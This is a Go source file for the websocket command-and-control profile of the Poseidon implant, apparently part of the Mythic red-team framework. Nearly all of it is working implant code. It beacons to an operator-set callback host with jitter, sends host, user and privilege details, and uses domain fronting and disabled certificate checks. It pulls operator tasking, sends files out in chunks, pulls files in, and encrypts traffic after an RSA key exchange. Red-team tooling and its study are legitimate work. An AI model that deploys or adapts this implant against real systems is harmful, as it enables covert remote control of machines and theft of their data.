// +build linux darwin
// +build websocket

package profiles

import (
	"bytes"
	"crypto/rsa"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"math"
	"math/rand"
	"net/http"
	"os"
	"reflect"
	"strconv"
	"strings"
	"time"

	// 3rd Party
	"github.com/gorilla/websocket"

	// Poseidon
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/crypto"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/functions"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// Websocket C2 profile variables from https://github.com/MythicC2Profiles/websocket/blob/master/C2_Profiles/websocket/mythic/c2_functions/websocket.py
// All variables must be a string so they can be set with ldflags

// callback_host is used to create the BaseURL value in the Websocket C2 profile
var callback_host string

// callback_port is used to create the BaseURL value in the Websocket C2 profile
var callback_port string

// USER_AGENT is the HTTP User-Agent header value
var USER_AGENT string

// AESPSK is Base64 of a 32B AES Key
var AESPSK string

// callback_interval is the callback interval in seconds
var callback_interval string

// encrypted_exchange_check is set to True or False to determine if Poseidon should do a key exchange
var encrypted_exchange_check string

// domain_front the Host header value for domain fronting
var domain_front string

// ENDPOINT_REPLACE is the websockets endpoint
var ENDPOINT_REPLACE string

// callback_jitter is the callback jitter in percent
var callback_jitter string

type C2Websockets struct {
	HostHeader     string
	BaseURL        string
	Interval       int
	Jitter         int
	ExchangingKeys bool
	ApfellID       string
	UserAgent      string
	UUID           string
	Key            string
	RsaPrivateKey  *rsa.PrivateKey
	Conn           *websocket.Conn
	Endpoint       string
}

// New creates a new HTTP C2 profile from the package's global variables and returns it
func New() Profile {
	profile := C2Websockets{
		HostHeader: domain_front,
		BaseURL:    fmt.Sprintf("%s:%s/", callback_host, callback_port),
		UserAgent:  USER_AGENT,
		Key:        AESPSK,
		Endpoint:   ENDPOINT_REPLACE,
		UUID:       UUID,
		ApfellID:   UUID,
	}

	// Convert sleep from string to integer
	i, err := strconv.Atoi(callback_interval)
	if err == nil {
		profile.Interval = i
	} else {
		profile.Interval = 10
	}

	// Convert jitter from string to integer
	j, err := strconv.Atoi(callback_jitter)
	if err == nil {
		profile.Jitter = j
	} else {
		profile.Jitter = 23
	}

	if encrypted_exchange_check == "T" {
		profile.ExchangingKeys = true
	}

	if len(profile.UserAgent) <= 0 {
		profile.UserAgent = "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/419.3 (KHTML, like Gecko) Safari/419.3"
	}

	return &profile
}

func (c C2Websockets) getSleepTime() int {
	if c.Jitter > 0 {
		jit := float64(rand.Int()%c.Jitter) / float64(100)
		jitDiff := float64(c.Interval) * jit
		if int(jit*100)%2 == 0 {
			return c.Interval + int(jitDiff)
		} else {
			return c.Interval - int(jitDiff)
		}
	} else {
		return c.Interval
	}
}

func (c C2Websockets) SleepInterval() int {
	return c.getSleepTime()
}

func (c *C2Websockets) SetSleepInterval(interval int) {
	c.Interval = interval
}

func (c *C2Websockets) SetSleepJitter(jitter int) {
	c.Jitter = jitter
}

func (c C2Websockets) ApfID() string {
	return c.ApfellID
}

func (c *C2Websockets) SetApfellID(newApf string) {
	c.ApfellID = newApf
}

func (c C2Websockets) ProfileType() string {
	t := reflect.TypeOf(c)
	return t.Name()
}

func (c *C2Websockets) CheckIn(ip string, pid int, user string, host string, operatingsystem string, arch string) interface{} {
	// Establish a connection to the websockets server
	url := fmt.Sprintf("%s%s", c.BaseURL, c.Endpoint)
	header := make(http.Header)
	header.Set("User-Agent", c.UserAgent)

	// Set the host header
	if len(c.HostHeader) > 0 {
		header.Set("Host", c.HostHeader)
	}

	d := websocket.Dialer{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}
	for true {
		connection, _, err := d.Dial(url, header)
		if err != nil {
			//log.Printf("Error connecting to server %s ", err.Error())
			//return structs.CheckInMessageResponse{Action: "checkin", Status: "failed"}
			time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
			continue
		}
		c.Conn = connection
		break
	}

	//log.Println("Connected to server ")
	var resp []byte

	checkin := structs.CheckInMessage{
		Action:       "checkin",
		IP:           ip,
		OS:           operatingsystem,
		User:         user,
		Host:         host,
		Pid:          pid,
		UUID:         c.UUID,
		Architecture: arch,
	}

	if functions.IsElevated() {
		checkin.IntegrityLevel = 3
	} else {
		checkin.IntegrityLevel = 2
	}
	checkinMsg, _ := json.Marshal(checkin)

	if c.ExchangingKeys {
		c.NegotiateKey()
	}

	resp = c.sendData("", checkinMsg)
	response := structs.CheckInMessageResponse{}
	err := json.Unmarshal(resp, &response)
	if err != nil {
		//log.Printf("Error unmarshaling response: %s", err.Error())
		return structs.CheckInMessageResponse{Status: "failed"}
	}

	if len(response.ID) > 0 {
		c.ApfellID = response.ID
	}

	return response
}

func (c *C2Websockets) GetTasking() interface{} {
	request := structs.TaskRequestMessage{}
	request.Action = "get_tasking"
	request.TaskingSize = -1

	raw, err := json.Marshal(request)

	if err != nil {
		//log.Printf("Error unmarshalling: %s", err.Error())
	}

	rawTask := c.sendData("", raw)
	task := structs.TaskRequestMessageResponse{}
	err = json.Unmarshal(rawTask, &task)

	if err != nil {
		//log.Printf("Error unmarshalling task data: %s", err.Error())
		return task
	}

	return task
}

func (c *C2Websockets) PostResponse(output []byte, skipChunking bool) []byte {
	return c.sendData("", output)
}

func (c *C2Websockets) SendFile(task structs.Task, params string, ch chan []byte) {

	path := task.Params
	// Get the file size first and then the # of chunks required
	file, err := os.Open(path)

	if err != nil {
		errResponse := structs.Response{}
		errResponse.Completed = true
		errResponse.TaskID = task.TaskID
		errResponse.UserOutput = fmt.Sprintf("Error opening file: %s", err.Error())
		errResponseEnc, _ := json.Marshal(errResponse)
		mu.Lock()
		TaskResponses = append(TaskResponses, errResponseEnc)
		mu.Unlock()
		return
	}

	fi, err := file.Stat()
	if err != nil {
		errResponse := structs.Response{}
		errResponse.Completed = true
		errResponse.TaskID = task.TaskID
		errResponse.UserOutput = fmt.Sprintf("Error getting file size: %s", err.Error())
		errResponseEnc, _ := json.Marshal(errResponse)
		mu.Lock()
		TaskResponses = append(TaskResponses, errResponseEnc)
		mu.Unlock()
		return
	}

	size := fi.Size()
	raw := make([]byte, size)
	_, err = file.Read(raw)
	if err != nil {
		errResponse := structs.Response{}
		errResponse.Completed = true
		errResponse.TaskID = task.TaskID
		errResponse.UserOutput = fmt.Sprintf("Error reading file: %s", err.Error())
		errResponseEnc, _ := json.Marshal(errResponse)
		mu.Lock()
		TaskResponses = append(TaskResponses, errResponseEnc)
		mu.Unlock()
		return
	}

	_ = file.Close()

	c.SendFileChunks(task, raw, ch)
}

func (c *C2Websockets) GetFile(r structs.FileRequest, ch chan []byte) ([]byte, error) {

	var byteHolder [][]byte
	fileUploadMsg := structs.FileUploadChunkMessage{} //Create the file upload chunk message
	fileUploadMsg.Action = "upload"
	fileUploadMsg.FileID = r.FileID
	fileUploadMsg.ChunkSize = 1024000
	fileUploadMsg.ChunkNum = 1
	fileUploadMsg.FullPath = r.FullPath
	fileUploadMsg.TaskID = r.TaskID

	msg, _ := json.Marshal(fileUploadMsg)
	mu.Lock()
	UploadResponses = append(UploadResponses, msg)
	mu.Unlock()
	// Wait for response from apfell
	rawData := <-ch

	fileUploadMsgResponse := structs.FileUploadChunkMessageResponse{} // Unmarshal the file upload response from apfell
	err := json.Unmarshal(rawData, &fileUploadMsgResponse)
	if err != nil {
		return []byte(""), err
	}

	decoded, _ := base64.StdEncoding.DecodeString(fileUploadMsgResponse.ChunkData)
	byteHolder = append(byteHolder, decoded)

	if fileUploadMsgResponse.TotalChunks > 1 {
		for index := 2; index <= fileUploadMsgResponse.TotalChunks; index++ {
			fileUploadMsg = structs.FileUploadChunkMessage{}
			fileUploadMsg.Action = "upload"
			fileUploadMsg.ChunkNum = index
			fileUploadMsg.ChunkSize = 1024000
			fileUploadMsg.FileID = r.FileID
			fileUploadMsg.FullPath = r.FullPath
			fileUploadMsg.TaskID = r.TaskID

			msg, _ := json.Marshal(fileUploadMsg)
			mu.Lock()
			UploadResponses = append(UploadResponses, msg)
			mu.Unlock()
			rawData := <-ch
			fileUploadMsgResponse = structs.FileUploadChunkMessageResponse{} // Unmarshal the file upload response from apfell
			err := json.Unmarshal(rawData, &fileUploadMsgResponse)
			if err != nil {
				return []byte(""), err
			}
			// Base64 decode the chunk data
			decoded, _ := base64.StdEncoding.DecodeString(fileUploadMsgResponse.ChunkData)
			byteHolder = append(byteHolder, decoded)
		}
	}
	results := bytes.Join(byteHolder, []byte(""))

	//
	//resp := structs.Response{}
	//resp.UserOutput = "File upload complete"
	//resp.Completed = true
	//resp.TaskID = task.TaskID
	//encResp, err := json.Marshal(resp)
	//mu.Lock()
	//TaskResponses = append(TaskResponses, encResp)
	//mu.Unlock()
	return results, nil
}

func (c *C2Websockets) SendFileChunks(task structs.Task, fileData []byte, ch chan []byte) {
	size := len(fileData)

	const fileChunk = 512000 //Normal apfell chunk size
	chunks := uint64(math.Ceil(float64(size) / fileChunk))
	chunkResponse := structs.FileDownloadInitialMessage{}
	chunkResponse.NumChunks = int(chunks)
	chunkResponse.TaskID = task.TaskID
	chunkResponse.FullPath = task.Params
	msg, _ := json.Marshal(chunkResponse)
	mu.Lock()
	TaskResponses = append(TaskResponses, msg)
	mu.Unlock()
	// Wait for a response from the channel
	var fileDetails map[string]interface{}
	// Wait for a response from the channel

	for {
		resp := <-ch
		err := json.Unmarshal(resp, &fileDetails)
		if err != nil {
			errResponse := structs.Response{}
			errResponse.Completed = true
			errResponse.TaskID = task.TaskID
			errResponse.UserOutput = fmt.Sprintf("Error unmarshaling task response: %s", err.Error())
			errResponseEnc, _ := json.Marshal(errResponse)

			mu.Lock()
			TaskResponses = append(TaskResponses, errResponseEnc)
			mu.Unlock()
			return
		}

		//log.Printf("Receive file download registration response %s\n", resp)
		if _, ok := fileDetails["file_id"]; ok {
			if ok {
				//log.Println("Found response with file_id key ", fileid)
				break
			} else {
				//log.Println("Didn't find response with file_id key")
				continue
			}
		}
	}

	r := bytes.NewBuffer(fileData)
	// Sleep here so we don't spam apfell
	//time.Sleep(time.Duration(c.getSleepTime()) * time.Second);
	for i := uint64(0); i < chunks; i++ {
		partSize := int(math.Min(fileChunk, float64(int64(size)-int64(i*fileChunk))))
		partBuffer := make([]byte, partSize)
		// Create a temporary buffer and read a chunk into that buffer from the file
		read, err := r.Read(partBuffer)
		if err != nil || read == 0 {
			break
		}

		msg := structs.FileDownloadChunkMessage{}
		msg.ChunkNum = int(i) + 1
		msg.FileID = fileDetails["file_id"].(string)
		msg.ChunkData = base64.StdEncoding.EncodeToString(partBuffer)
		msg.TaskID = task.TaskID

		encmsg, _ := json.Marshal(msg)
		mu.Lock()
		TaskResponses = append(TaskResponses, encmsg)
		mu.Unlock()

		// Wait for a response for our file chunk
		var postResp map[string]interface{}
		for {
			decResp := <-ch
			err := json.Unmarshal(decResp, &postResp) // Wait for a response for our file chunk

			if err != nil {
				errResponse := structs.Response{}
				errResponse.Completed = true
				errResponse.TaskID = task.TaskID
				errResponse.UserOutput = fmt.Sprintf("Error unmarshaling task response: %s", err.Error())
				errResponseEnc, _ := json.Marshal(errResponse)
				mu.Lock()
				TaskResponses = append(TaskResponses, errResponseEnc)
				mu.Unlock()
				return
			}

			//log.Printf("Received chunk download response %s\n", decResp)
			if _, ok := postResp["status"]; ok {
				if ok {
					//log.Println("Found response with status key: ", status)
					break
				} else {
					//log.Println("Didn't find response with status key")
					continue
				}
			}
		}

		if !strings.Contains(postResp["status"].(string), "success") {
			// If the post was not successful, wait and try to send it one more time

			mu.Lock()
			TaskResponses = append(TaskResponses, encmsg)
			mu.Unlock()
		}

		time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
	}
	// Reset the buffer to be empty
	r.Reset()
	r = nil
	fileData = nil

	final := structs.Response{}
	final.Completed = true
	final.TaskID = task.TaskID
	final.UserOutput = "file downloaded"
	finalEnc, _ := json.Marshal(final)
	//c.PostResponse(task, string(finalEnc))
	mu.Lock()
	TaskResponses = append(TaskResponses, finalEnc)
	mu.Unlock()
}

func (c *C2Websockets) NegotiateKey() string {
	sessionID := GenerateSessionID()
	pub, priv := crypto.GenerateRSAKeyPair()
	c.RsaPrivateKey = priv
	//initMessage := structs.EKEInit{}
	initMessage := structs.EkeKeyExchangeMessage{}
	initMessage.Action = "staging_rsa"
	initMessage.SessionID = sessionID
	initMessage.PubKey = base64.StdEncoding.EncodeToString(pub)

	// Encode and encrypt the json message
	raw, err := json.Marshal(initMessage)

	if err != nil {
		//log.Printf("Error marshaling data: %s", err.Error())
		return ""
	}

	//log.Printf("Sending EKE msg: %+v\n", initMessage)
	resp := c.sendData("", raw)

	//decryptedResponse := crypto.RsaDecryptCipherBytes(resp, c.RsaPrivateKey)
	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}

	err = json.Unmarshal(resp, &sessionKeyResp)
	if err != nil {
		//log.Printf("Error unmarshaling RsaResponse %s", err.Error())
		return ""
	}

	//log.Printf("Received EKE response: %+v\n", sessionKeyResp)
	// Save the new AES session key
	encryptedSesionKey, _ := base64.StdEncoding.DecodeString(sessionKeyResp.SessionKey)
	decryptedKey := crypto.RsaDecryptCipherBytes(encryptedSesionKey, c.RsaPrivateKey)
	c.Key = base64.StdEncoding.EncodeToString(decryptedKey) // Save the new AES session key
	c.ExchangingKeys = false

	if len(sessionKeyResp.UUID) > 0 {
		c.ApfellID = sessionKeyResp.UUID
	}

	return sessionID

}

func (c *C2Websockets) reconnect() {
	header := make(http.Header)
	header.Set("User-Agent", c.UserAgent)
	if len(c.HostHeader) > 0 {
		header.Set("Host", c.HostHeader)
	}
	d := websocket.Dialer{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}
	url := fmt.Sprintf("%s%s", c.BaseURL, c.Endpoint)
	for true {
		connection, _, err := d.Dial(url, header)
		if err != nil {
			//log.Printf("Error connecting to server %s ", err.Error())
			//return structs.CheckInMessageResponse{Action: "checkin", Status: "failed"}
			time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
			continue
		}
		c.Conn = connection
		break
	}
}

func (c *C2Websockets) sendData(tag string, sendData []byte) []byte {
	m := structs.Message{}
	if len(c.Key) != 0 {
		sendData = c.encryptMessage(sendData)
	}

	sendData = append([]byte(c.ApfellID), sendData...)
	sendData = []byte(base64.StdEncoding.EncodeToString(sendData))
	for true {
		m.Client = true
		m.Data = string(sendData)
		m.Tag = tag
		//log.Printf("Sending message %+v\n", m)
		err := c.Conn.WriteJSON(m)
		if err != nil {
			//log.Printf("%v", err);
			c.reconnect()
			continue
		}
		// Read the response
		resp := structs.Message{}
		err = c.Conn.ReadJSON(&resp)

		if err != nil {
			//log.Println("Error trying to read message ", err.Error())
			c.reconnect()
			continue
		}

		raw, err := base64.StdEncoding.DecodeString(resp.Data)
		if err != nil {
			//log.Println("Error decoding base64 data: ", err.Error())
			return make([]byte, 0)
		}

		if len(raw) < 36 {
			//log.Println("length of data < 36")
			time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
			continue
		}

		enc_raw := raw[36:] // Remove the Payload UUID

		if len(c.Key) != 0 {
			//log.Printf("Decrypting data")
			enc_raw = c.decryptMessage(enc_raw)
			if len(enc_raw) == 0 {
				time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
				continue
			}
		}

		return enc_raw
	}

	return make([]byte, 0)
}

func (c *C2Websockets) encryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesEncrypt(key, msg)
}

func (c *C2Websockets) decryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesDecrypt(key, msg)
}
